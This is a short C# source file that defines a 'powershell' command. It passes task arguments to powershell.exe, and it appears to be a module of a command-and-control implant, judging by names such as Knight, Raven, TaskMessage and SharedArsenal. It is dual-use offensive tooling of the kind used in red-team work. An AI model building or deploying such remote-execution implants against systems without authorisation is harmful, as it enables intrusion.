using Internal = SharedArsenal.Internal;
using Knight.Models.Raven;

namespace Knight.Commands
{
    public class PowerShell : KnightCommand
    {
        public override string Name => "powershell";

        public override string Execute(TaskMessage task)
        {
            var args = string.Join(" ", task.Arguments);

            return Internal.Execute.ExecuteCommand(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", args);
        }
    }
}